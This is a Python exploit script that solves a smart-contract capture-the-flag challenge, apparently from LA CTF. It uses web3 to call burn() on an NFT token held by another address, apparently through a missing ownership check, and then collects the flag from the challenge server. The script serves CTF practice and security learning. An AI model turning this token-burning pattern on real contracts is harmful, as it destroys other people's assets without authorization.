from solcx import compile_files, install_solc_pragma
from web3 import Web3
from pwn import log, remote
install_solc_pragma('pragma solidity ^0.8.18;')
log.setLevel('debug')


uuid = input().strip()
rpc = input().strip()
private_key = input().strip()
setupContract = input().strip()
log.info(f"{uuid = }")
log.info(f"{rpc = }")
log.info(f"{private_key = }")
log.info(f"{setupContract = }")
# compile sol
compiled_sol = compile_files(
    ['Setup.sol', 'Friend.sol'],
    output_values=['abi', 'bin'],
    solc_version="0.8.18"
)
SetupContract = compiled_sol['Setup.sol:Setup']
FriendContract = compiled_sol['Friend.sol:Friend']

w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
log.info(f"My address: {my_address}")
log.info(f"My balance: {w3.eth.get_balance(my_address)}")

# log.debug("All accounts in this current network: ")
# for _address in w3.eth.accounts:
#     log.info(f"Address: {_address}, balance: {w3.eth.get_balance(_address)}")


# remote contract
Setup = w3.eth.contract(address=setupContract, abi=SetupContract['abi'])
friendAddress = Setup.functions.friend().call()
Friend = w3.eth.contract(address=friendAddress, abi=FriendContract['abi'])


def getTotalFriend(address):
    return Friend.functions.balanceOf(address).call()


sbyutk_address = Setup.functions.somebodyYouUsedToKnow().call()
log.info(f"Remaining friend: {getTotalFriend(sbyutk_address)}")
tokenID = Friend.functions.tokenOfOwnerByIndex(sbyutk_address, 0).call()
log.info(f"TokenID of mine: {tokenID}")

with log.progress("Deleting stored friendNames") as tx_status:
    tx_unfriend_hash = Friend.functions.burn(tokenID).transact({
        "chainId": w3.eth.chainId,
        "gasPrice": w3.eth.gas_price,
        "from": my_address,
        "nonce": w3.eth.getTransactionCount(my_address)
    })
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_unfriend_hash)

remain_friend = getTotalFriend(sbyutk_address)
log.info(f"Remaining friend: {remain_friend}")
assert remain_friend == 0

# get flag
io = remote("lac.tf", 31150, level='error')
io.sendlineafter(b'action? ', b'3')
io.sendlineafter(b'uuid please: ', uuid.encode())
log.success(io.recvline(0).decode())
io.close()
# close instance
io = remote("lac.tf", 31150, level='error')
io.sendlineafter(b'action? ', b'2')
io.sendlineafter(b'uuid please: ', uuid.encode())
io.close()
